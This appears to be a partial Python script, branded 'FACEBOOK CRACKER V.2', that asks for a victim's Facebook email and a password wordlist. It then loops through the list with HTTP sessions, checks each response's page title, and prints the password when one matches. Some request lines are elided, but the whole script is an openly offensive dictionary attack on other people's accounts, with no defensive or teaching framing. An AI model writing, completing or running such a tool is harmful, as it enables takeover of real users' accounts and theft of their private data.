...
email = input('input victims fb email : ')
sandi = input('input password.txt : ')
print (' ')

print (cyy+'           ###############################')
print (cyy+'           #' + G +'    FACEBOOK CRACKER V.2' + cyy +'     #')
print (cyy+'           ###############################')
print (cyy+'           |                             |')
print (cyy+'           |' + yl +'   CTRL + Z to stop program' + cyy +'  |')
print (cyy+'           |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|')
print (cyy+'           |' + yl +'   AUTHOR : RISKI DARMAWAN' + cyy +'   |')
print (cyy+'           |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|')
print (cyy+'           ###############################')
print (' ')
print (w+'   [+] EMAIL HACKED : ' + email)
print (w+'   [+] PLEASE WAIT ^_^ ')
print (' ')
print (' ')
passw = open(sandi, 'r')
def br():
   for password in passw:
       ...
       with requests.Session() as c:
           ...
           if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
                print ('[+] Try wordlist...', password,end="", flush=True)
                ...
                print ( ' ' )
                print (' ')
                print ('Password has been obtained ^_^\n')
                print ( ' ')
                print ('This is the password ==>> ' + password)
                exit()

   print (yl+'[*] Failed: because of the harsh wordlist [*]')
